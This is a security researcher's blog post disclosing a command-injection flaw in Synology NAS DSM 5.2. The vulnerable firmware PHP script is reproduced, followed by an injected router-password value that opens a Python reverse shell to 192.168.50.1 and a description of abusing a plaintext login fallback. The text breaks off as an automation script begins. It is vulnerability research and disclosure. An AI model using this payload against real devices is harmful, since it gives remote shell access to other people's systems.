<!DOCTYPE html>
<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Riley Kidd - Synology NAS DSM 5.2 Remote Code Execution (RCE)</title>
  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  <link href="//fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">
  <link href="//fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet" type="text/css">
  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
  <link href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/css/lightbox.min.css" rel="stylesheet" type="text/css">
  <link rel="stylesheet" href="/assets/css/all.css">
  <link rel="alternate" type="application/atom+xml" title="Riley Kidd" href="http://0.0.0.0:4000/atom.xml" />
</head>
<body>
  <div class="container">
    <div class="three columns sidebar">
      <nav>
  <h2 id="banner"><a href="/">Riley Kidd</a></h2>
  <div id="bio">
    <p>Security from a different perspective</p>
  </div>
  <div id="social">
    <div id="stalker">
  
  
  <a title="LinkedIn" href="https://www.linkedin.com/in/rileykidd">
    <i class="fa fa-linkedin-square"></i>
  </a>
  
  
  <a title="Send an email" href="mailto:rileykidd@protonmail.com">
    <i class="fa fa-envelope-square"></i>
  </a>
  
  
  <a title="Atom feed" id="atom" href="/atom.xml">
    <i class="fa fa-rss-square"></i>
  </a>
  
</div>

  </div>
</nav>

    </div>
    <div class="nine columns content">
      <h1 class="title">Synology NAS DSM 5.2 Remote Code Execution (RCE)</h1>
<p class="meta">
  January 12, 2016
</p>
<div id="post">
  <p><a href="/assets/images/1.png" data-lightbox="1"><img src="/assets/images/1.png" alt="" /></a></p>

<h2 id="tldr">TLDR</h2>

<p>RCE in Synology NAS DSM 5.2 due to lack of input sanitisation. RCE triggered indirectly via port forwarding mechanism in the NAS UI.</p>

<h2 id="getting-started">Getting started</h2>

<p>I recently bought a Synology DS416 NAS and noticed during the set-up process you are first required to download the device firmware, which is then flashed to the device via the setup web interface.</p>

<p>Interested in my new devices security, I decided to take a look at the firmware while the system was installing.</p>

<p>Firstly, let’s download the DSM 5.2 firmware (unsure which versions are affected by this vulnerability) from the official Synology download center and identify what we are dealing with:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://global.download.synology.com/download/DSM/release/5.2/5644/DSM_DS416_5644.pat
file DSM_DS416_5644.pat
DSM_DS416_5644.pat: POSIX <span class="nb">tar </span>archive <span class="o">(</span>GNU<span class="o">)</span>
<span class="nb">tar</span> <span class="nt">-xvf</span> DSM_DS416_5644.pat
</code></pre></div></div>
<p><a href="/assets/images/3.png" data-lightbox="1"><img src="/assets/images/3.png" alt="" /></a></p>

<p>So, the archived <code class="highlighter-rouge">DSM_DS416_5644.pat</code> file contains a number of subsidiary files and packages, as well as what looks like a compressed kernel. As the device has no default storage (OS is installed to your separate HDD’s), <code class="highlighter-rouge">hda1.tgz</code> immediately looks interesting.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file hda1.tgz
hda1.tgz: XZ compressed data
tar -xvf hda1.tgz
</code></pre></div></div>
<p><a href="/assets/images/4.png" data-lightbox="1"><img src="/assets/images/4.png" alt="" /></a></p>

<p>So <code class="highlighter-rouge">hda1.tgz</code> is another archive, in which we find what looks to be a Linux filesystem.</p>

<p>After some cursory browsing, I noticed some helper <code class="highlighter-rouge">php</code> files are in use, so let’s look for some low hanging fruit.</p>

<p><a href="/assets/images/5-syn.png" data-lightbox="1"><img src="/assets/images/5-syn.png" alt="" /></a></p>

<h2 id="php-101">PHP 101</h2>

<p>Let’s take a look at our first grep result:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat ./etc/portforward/routerdb/BT/HomeHub2.0/Version8.1.H.G_TypeA/dele_rule.php
</code></pre></div></div>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/php</span>
<span class="o">&lt;?</span><span class="nx">php</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="c1">#unassign all application in router. It's may be over max_number in assigned app.</span>
<span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"argv"</span><span class="p">][</span><span class="mi">1</span><span class="p">];</span>
<span class="nv">$rn</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"argv"</span><span class="p">][</span><span class="mi">2</span><span class="p">];</span>
<span class="nv">$dev_ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"argv"</span><span class="p">][</span><span class="mi">3</span><span class="p">];</span>
<span class="nv">$header</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"argv"</span><span class="p">][</span><span class="mi">4</span><span class="p">];</span>
<span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"argv"</span><span class="p">][</span><span class="mi">5</span><span class="p">];</span>
<span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"argv"</span><span class="p">][</span><span class="mi">6</span><span class="p">];</span>
<span class="nv">$dev_name</span> <span class="o">=</span><span class="s2">""</span><span class="p">;</span>
<span class="nv">$synologyNo</span><span class="p">;</span>
<span class="nv">$deletenow</span><span class="p">;</span>
<span class="nv">$App</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$appDev</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$deleDev</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="nv">$szCmd</span><span class="p">;</span>
<span class="k">foreach</span> <span class="p">(</span><span class="nb">file</span> <span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
	<span class="c1">#get DS's Device Name</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/&lt;option value=</span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span><span class="nv">$dev_ip</span><span class="o">.</span><span class="s2">"</span><span class="se">\"</span><span class="s2">&gt;(\S+)&lt;\/option&gt;/i"</span> <span class="p">,</span><span class="nv">$value</span> <span class="p">,</span> <span class="nv">$match</span><span class="p">))</span>  <span class="p">{</span>
        <span class="nv">$dev_name</span> <span class="o">=</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
	<span class="c1">#Application defined by synology.</span>
	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/&lt;tr class=</span><span class="se">\"</span><span class="s2">\S+</span><span class="se">\"</span><span class="s2">&gt;&lt;td class=</span><span class="se">\"</span><span class="s2">indence fixedtdwidth fixedtd</span><span class="se">\"</span><span class="s2">&gt;synology&lt;input name=</span><span class="se">\"</span><span class="s2">delete\d+</span><span class="se">\"</span><span class="s2"> type=</span><span class="se">\"</span><span class="s2">hidden</span><span class="se">\"</span><span class="s2"> value=</span><span class="se">\"</span><span class="s2">(\d+)</span><span class="se">\"</span><span class="s2">/i"</span> <span class="p">,</span><span class="nv">$value</span> <span class="p">,</span> <span class="nv">$match</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$synologyNo</span> <span class="o">=</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
		<span class="nv">$App</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
	<span class="c1">#All Assigned Application Name.</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/&lt;tr class=</span><span class="se">\"</span><span class="s2">\S+</span><span class="se">\"</span><span class="s2">&gt;&lt;td class=</span><span class="se">\"</span><span class="s2">indence fixedtdwidth fixedtd</span><span class="se">\"</span><span class="s2">&gt;.+&lt;input name=</span><span class="se">\"</span><span class="s2">delete\S+</span><span class="se">\"</span><span class="s2"> type=</span><span class="se">\"</span><span class="s2">hidden</span><span class="se">\"</span><span class="s2"> value=</span><span class="se">\"</span><span class="s2">(\d+)</span><span class="se">\"</span><span class="s2">/i"</span> <span class="p">,</span><span class="nv">$value</span> <span class="p">,</span> <span class="nv">$match</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$App</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
	<span class="c1">#All Assigned Application Name.</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/td class=</span><span class="se">\"</span><span class="s2">indence fixedtdwidth fixedtd</span><span class="se">\"</span><span class="s2"> style=</span><span class="se">\"</span><span class="s2">position:relative; z-index:1;</span><span class="se">\"</span><span class="s2">&gt;(\S+)&lt;\/td&gt;&lt;td class/i"</span> <span class="p">,</span><span class="nv">$value</span> <span class="p">,</span> <span class="nv">$match</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$appDev</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
	<span class="c1">#All Assigned Application's Device Name.</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/&lt;\/table&gt;/i"</span> <span class="p">,</span><span class="nv">$value</span> <span class="p">,</span> <span class="nv">$match</span><span class="p">))</span> <span class="p">{</span>
		<span class="k">break</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nb">unset</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
<span class="c1">#scalar(@APP) must the same with scalar(@appDev)</span>
<span class="c1">#according to $dev_name, decide which Application need be delete.</span>
<span class="nv">$app_count</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$appDev</span><span class="p">);</span>
<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$app_count</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/^"</span><span class="o">.</span><span class="nv">$dev_name</span><span class="o">.</span><span class="s2">"$/"</span><span class="p">,</span> <span class="nv">$appDev</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">||</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/^"</span><span class="o">.</span><span class="nv">$synologyNo</span><span class="o">.</span><span class="s2">"$/"</span><span class="p">,</span> <span class="nv">$App</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span> <span class="p">{</span>
		<span class="nv">$deleDev</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$App</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="nv">$dele_count</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$deleDev</span><span class="p">);</span>
<span class="nv">$deleStr</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$dele_count</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
	<span class="nv">$app_count</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$App</span><span class="p">);</span>
	<span class="nv">$deleStr</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
	<span class="k">for</span> <span class="p">(</span><span class="nv">$t</span> <span class="o">=</span> <span class="mi">1</span> <span class="p">;</span> <span class="nv">$t</span> <span class="o">&lt;=</span> <span class="nv">$app_count</span> <span class="p">;</span> <span class="nv">$t</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="nv">$deleStr</span><span class="o">=</span><span class="nv">$deleStr</span><span class="o">.</span><span class="s2">"&amp;delete"</span><span class="o">.</span><span class="nv">$t</span><span class="o">.</span><span class="s2">"="</span><span class="o">.</span><span class="nv">$App</span><span class="p">[</span><span class="nv">$t</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>	
		<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/"</span><span class="o">.</span><span class="nb">preg_quote</span><span class="p">(</span><span class="nv">$App</span><span class="p">[</span><span class="nv">$t</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="s2">"/"</span><span class="p">,</span> <span class="nv">$deleDev</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> <span class="nv">$m</span><span class="p">))</span> <span class="p">{</span>
			<span class="nv">$deletenow</span><span class="o">=</span><span class="nv">$t</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="nv">$szCmd</span><span class="o">=</span><span class="s2">"/usr/syno/bin/curl -b "</span><span class="o">.</span><span class="nv">$header</span><span class="o">.</span><span class="s2">" -u 'admin:"</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">"' -d 'app_name=-"</span><span class="o">.</span><span class="nv">$deleStr</span><span class="o">.</span><span class="s2">"&amp;device_ip=-&amp;form_action=delete"</span><span class="o">.</span><span class="nv">$deletenow</span><span class="o">.</span><span class="s2">"&amp;rn="</span><span class="o">.</span><span class="nv">$rn</span><span class="o">.</span><span class="s2">"' '"</span><span class="o">.</span><span class="nv">$url</span><span class="o">.</span><span class="s2">"'"</span><span class="p">;</span>
	<span class="nb">system</span><span class="p">(</span><span class="nv">$szCmd</span><span class="p">);</span>
	<span class="nv">$tmparray</span><span class="o">=</span><span class="nv">$App</span><span class="p">;</span>
	<span class="nv">$App</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
	<span class="k">for</span><span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span> <span class="nv">$j</span> <span class="o">&lt;</span> <span class="nv">$app_count</span> <span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span><span class="p">(</span><span class="nv">$tmparray</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span> <span class="o">!==</span> <span class="nv">$deleDev</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="p">{</span>
			<span class="nv">$App</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$tmparray</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>As we can see, the php script above appears to contain the following functionality:</p>
<ul>
  <li>Take inputs passed to the script</li>
  <li>Add port forwarding rules via a 3rd party routers web interface</li>
  <li>Delete port forwarding rules via a 3rd party routers web interface</li>
</ul>

<p>Interestingly, when a port is deleted the (unsanitised) inputs passed to the script are unsafetly concatenated into a string, then passed to a php system call. If we can control these inputs, we can ‘break out’ of the string and append arbitrary commands to the system call; thereby obtaining RCE on the NAS device.</p>

<h2 id="a-first-look">A first look</h2>

<p>The NAS OS has installed by this point, so we can login to the device and take a look around the UI. The UI looks nice and the control panel appears to have many features. One in particular that takes my immediate interest (based on the script above) is <em>‘External Access’</em>.</p>

<p><a href="/assets/images/6.png" data-lightbox="1"><img src="/assets/images/6.png" alt="" /></a></p>

<p><a href="/assets/images/7.png" data-lightbox="1"><img src="/assets/images/7.png" alt="" /></a></p>

<p>The <em>‘External Access’</em> option permits users to configure their router and from within the NAS UI they can perform actions on their router such as adding or deleting forwarded ports. Based on the naming convention of our vulnerable script above, the <em>‘BT: HomeHUB2.0’</em> looks promising. By using the <em>‘custom router account’</em> we can also identify what appears to be the parameters being passed to the script.</p>

<h2 id="gaining-access">Gaining access</h2>

<p>Assuming these parameters are passed directly to the php script with no intermediate sanitisation, we can attempt to modify the php system call by ‘breaking out’ of the unsafetly concatenated string and appending our own arbitrary commands.</p>

<p>In particular, the offending line:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$szCmd</span><span class="o">=</span><span class="s2">"/usr/syno/bin/curl -b "</span><span class="o">.</span><span class="nv">$header</span><span class="o">.</span><span class="s2">" -u 'admin:"</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">"' -d 'app_name=-"</span><span class="o">.</span><span class="nv">$deleStr</span><span class="o">.</span><span class="s2">"&amp;device_ip=-&amp;form_action=delete"</span><span class="o">.</span><span class="nv">$deletenow</span><span class="o">.</span><span class="s2">"&amp;rn="</span><span class="o">.</span><span class="nv">$rn</span><span class="o">.</span><span class="s2">"' '"</span><span class="o">.</span><span class="nv">$url</span><span class="o">.</span><span class="s2">"'"</span><span class="p">;</span>
</code></pre></div></div>

<p>For example, by changing our router password to <code class="highlighter-rouge">a\';touch /tmp/test</code>, we should ‘break out’ of the initial command and append <code class="highlighter-rouge">touch /tmp/test</code>, which will then also be passed to the system call. Thereby writing the file <code class="highlighter-rouge">test</code> to the <code class="highlighter-rouge">/tmp</code> directory of the NAS device.</p>

<p>Creating files is well and good, but to make the most of an RCE, we want a revere shell.</p>

<p>For example, using python we can set the following password for the HomeHub2.0 router, which will initiate a reverse shell from the NAS device to our system listening at <code class="highlighter-rouge">192.168.50.1</code> on TCP port <code class="highlighter-rouge">1234</code> when the affected call is triggered:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">b</span>\<span class="s">';python -c '</span><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span><span class="n">subprocess</span><span class="p">,</span><span class="n">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"192.168.50.1"</span><span class="p">,</span><span class="mi">1234</span><span class="p">));</span><span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span><span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">call</span><span class="p">([</span><span class="s">"/bin/sh"</span><span class="p">,</span><span class="s">"-i"</span><span class="p">])</span>
</code></pre></div></div>

<p>Once the backdoored router password has been added, we simply need to follow the information flow as per the script above to trigger our backdoor and gain a reverse shell:</p>
<ul>
  <li>Login to the NAS UI</li>
  <li>Set up the HomeHub2.0 router with the backdoored password</li>
  <li>Delete some router rule</li>
</ul>

<h2 id="automating-the-process">Automating the process</h2>

<p>Naturally, we want to automate this attack. Unfortunately, the login process to the NAS is not straight forward. When logging in, the username and password (and some additional parameters) are encrypted with both RSA and AES (assumedly to protect against MITM attacks on the network) and then the encrypted data is posted to the server.</p>

<p>Looking at the client side JavaScript files we can identify how this encryption is being performed.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">onEncryptionDone</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">h</span><span class="p">,</span> <span class="nx">f</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">form</span><span class="p">.</span><span class="nx">findField</span><span class="p">(</span><span class="dl">"</span><span class="s2">passwd</span><span class="dl">"</span><span class="p">),</span>
            <span class="nx">b</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">form</span><span class="p">.</span><span class="nx">findField</span><span class="p">(</span><span class="dl">"</span><span class="s2">__cIpHeRtExT</span><span class="dl">"</span><span class="p">),</span>
            <span class="nx">e</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">form</span><span class="p">.</span><span class="nx">findField</span><span class="p">(</span><span class="dl">"</span><span class="s2">client_time</span><span class="dl">"</span><span class="p">),</span>
            <span class="nx">d</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span>
            <span class="nx">g</span> <span class="o">=</span> <span class="p">{};</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">SYNO</span><span class="p">.</span><span class="nx">Encryption</span><span class="p">.</span><span class="nx">CipherKey</span> <span class="o">=</span> <span class="nx">h</span><span class="p">.</span><span class="nx">cipherkey</span><span class="p">;</span>
            <span class="nx">SYNO</span><span class="p">.</span><span class="nx">Encryption</span><span class="p">.</span><span class="nx">RSAModulus</span> <span class="o">=</span> <span class="nx">h</span><span class="p">.</span><span class="nx">public_key</span><span class="p">;</span>
            <span class="nx">SYNO</span><span class="p">.</span><span class="nx">Encryption</span><span class="p">.</span><span class="nx">CipherToken</span> <span class="o">=</span> <span class="nx">h</span><span class="p">.</span><span class="nx">ciphertoken</span><span class="p">;</span>
            <span class="nx">SYNO</span><span class="p">.</span><span class="nx">Encryption</span><span class="p">.</span><span class="nx">TimeBias</span> <span class="o">=</span> <span class="nx">h</span><span class="p">.</span><span class="nx">server_time</span> <span class="o">-</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="o">+</span><span class="k">new</span> <span class="nb">Date</span><span class="p">()</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="nx">g</span><span class="p">[</span><span class="nx">c</span><span class="p">.</span><span class="nx">getName</span><span class="p">()]</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">getValue</span><span class="p">();</span>
        <span class="nx">g</span><span class="p">.</span><span class="nx">key</span> <span class="o">=</span> <span class="nx">SYNO</span><span class="p">.</span><span class="nx">SDS</span><span class="p">.</span><span class="nx">ForgetPass</span><span class="p">.</span><span class="nx">ticket</span><span class="p">;</span>
        <span class="nx">g</span><span class="p">[</span><span class="nx">e</span><span class="p">.</span><span class="nx">getName</span><span class="p">()]</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">getValue</span><span class="p">();</span>
        <span class="nx">g</span> <span class="o">=</span> <span class="nx">SYNO</span><span class="p">.</span><span class="nx">Encryption</span><span class="p">.</span><span class="nx">EncryptParam</span><span class="p">(</span><span class="nx">g</span><span class="p">);</span>
        <span class="nx">d</span> <span class="o">=</span> <span class="nx">g</span><span class="p">[</span><span class="nx">h</span><span class="p">.</span><span class="nx">cipherkey</span><span class="p">]</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
        <span class="nx">b</span><span class="p">.</span><span class="nx">setValue</span><span class="p">(</span><span class="nx">d</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="nx">initIFrameEvent</span><span class="p">();</span>
        <span class="k">this</span><span class="p">.</span><span class="nx">setFormDisabled</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="o">!!</span><span class="nx">d</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="nx">form</span><span class="p">.</span><span class="nx">el</span><span class="p">.</span><span class="nx">dom</span><span class="p">.</span><span class="nx">submit</span><span class="p">()</span>
    <span class="p">},</span>
<span class="nx">SYNO</span><span class="p">.</span><span class="nx">Encryption</span><span class="p">.</span><span class="nx">EncryptParam</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">g</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">c</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">d</span> <span class="o">=</span> <span class="p">{},</span>
        <span class="nx">a</span> <span class="o">=</span> <span class="p">{},</span>
        <span class="nx">f</span> <span class="o">=</span> <span class="nx">SYNO</span><span class="p">.</span><span class="nx">Encryption</span><span class="p">.</span><span class="nx">GenRandomKey</span><span class="p">(</span><span class="mi">501</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">SYNO</span><span class="p">.</span><span class="nx">Encryption</span><span class="p">.</span><span class="nx">CipherKey</span> <span class="o">||</span> <span class="o">!</span><span class="nx">SYNO</span><span class="p">.</span><span class="nx">Encryption</span><span class="p">.</span><span class="nx">RSAModulus</span> <span class="o">||</span> <span class="o">!</span><span class="nx">SYNO</span><span class="p">.</span><span class="nx">Encryption</span><span class="p">.</span><span class="nx">CipherToken</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">g</span>
    <span class="p">}</span>
    <span class="nx">e</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SYNO</span><span class="p">.</span><span class="nx">Encryption</span><span class="p">.</span><span class="nx">RSA</span><span class="p">();</span>
    <span class="nx">e</span><span class="p">.</span><span class="nx">setPublic</span><span class="p">(</span><span class="nx">SYNO</span><span class="p">.</span><span class="nx">Encryption</span><span class="p">.</span><span class="nx">RSAModulus</span><span class="p">,</span> <span class="dl">"</span><span class="s2">10001</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">d</span><span class="p">[</span><span class="nx">SYNO</span><span class="p">.</span><span class="nx">Encryption</span><span class="p">.</span><span class="nx">CipherToken</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="o">+</span><span class="k">new</span> <span class="nb">Date</span><span class="p">()</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">)</span> <span class="o">+</span> <span class="nx">SYNO</span><span class="p">.</span><span class="nx">Encryption</span><span class="p">.</span><span class="nx">TimeBias</span><span class="p">;</span>
    <span class="nx">c</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">g</span>
    <span class="p">}</span>
    <span class="nx">Ext</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">d</span><span class="p">,</span> <span class="nx">g</span><span class="p">);</span>
    <span class="nx">b</span> <span class="o">=</span> <span class="nx">SYNO</span><span class="p">.</span><span class="nx">Encryption</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">Ext</span><span class="p">.</span><span class="nx">urlEncode</span><span class="p">(</span><span class="nx">d</span><span class="p">),</span> <span class="nx">f</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">g</span>
    <span class="p">}</span>
    <span class="nx">a</span><span class="p">[</span><span class="nx">SYNO</span><span class="p">.</span><span class="nx">Encryption</span><span class="p">.</span><span class="nx">CipherKey</span><span class="p">]</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
        <span class="na">rsa</span><span class="p">:</span> <span class="nx">SYNO</span><span class="p">.</span><span class="nx">Encryption</span><span class="p">.</span><span class="nx">Base64</span><span class="p">.</span><span class="nx">hex2b64</span><span class="p">(</span><span class="nx">c</span><span class="p">),</span>
        <span class="na">aes</span><span class="p">:</span> <span class="nx">b</span>
    <span class="p">});</span>
    <span class="k">return</span> <span class="nx">a</span>
<span class="p">};</span>
</code></pre></div></div>

<p>During the login process, the client also submits a request to obtain the server’s public key. As seen in the script above, when a response from the server results in a failure, it’s possible to submit the valid login request in plain text. Therefore we don’t need to re-implement this encryption method, we can instead abuse the insecure fall back.</p>

<p>Firstly, we login to the device:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
